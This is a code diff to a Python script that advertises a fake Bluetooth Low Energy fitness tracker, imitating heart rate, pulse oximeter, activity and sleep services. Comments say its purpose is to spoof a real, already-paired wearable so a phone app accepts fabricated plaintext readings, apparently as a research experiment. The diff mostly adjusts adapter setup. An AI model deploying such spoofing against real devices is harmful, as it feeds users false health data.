@@ -10,8 +10,9 @@ from services.fake_heart_rate_service import HEARTRATE_SERVICE, FakeHeartRateSer
 from services.fake_pulse_oximeter_service import PULSEOXIMETER_SERVICE, FakePulseOximeterService
 from services.fake_physical_activity_monitor_service import PHYSICAL_ACTIVITY_SERVICE, FakePhysicalActivityMonitorService
 from services.fake_sleep_monitor_service import SLEEP_MONITOR_SERVICE, FakeSleepMonitorService
-from utils.adapter_utils import set_adapter_alias
+from utils.adapter_utils import set_adapter_alias, set_adapter_discoverable, set_adapter_powered
 from utils.btmgmt_utils import setup_btmgmt
+import os
 
 DEVICE_NAME = "Secured FitTrack"
 RED = "\033[91m"
@@ -139,6 +140,8 @@ async def stdin_reader_and_dispatch(pams_queue: Queue, sams_queue: Queue, stop_e
 
 
 async def main():
+    if setup_btmgmt() == False:
+        return
 
     # for this attack the client (app smartphone device) will already be paired with the real ble peripheral
     # we advertise the fake ble peripheral with characterstics in plaintext and the app should accept this
@@ -156,9 +159,6 @@ async def main():
     # or brute force the payload formats, by trying various combinations of byte payloads
     # for this experiment we assume the attacker knows all of the payloads, as this is not the scope of the attack
 
-    if (setup_btmgmt() == False):
-        return
-
     bus = await get_message_bus()
 
     if await is_bluez_available(bus):
@@ -166,6 +166,10 @@ async def main():
     else:
         print("BlueZ not available on system bus")
         return
+
+    await set_adapter_powered(bus)
+    await set_adapter_discoverable(bus)
+    await set_adapter_powered(bus)
 
     # NoIoAgent will accept all incoming pairing requests from all devices unconditionally, so
     # o if we paired the real device and the fake peripheral presents itself with the MAC address or device name of the real BLE peripheral,
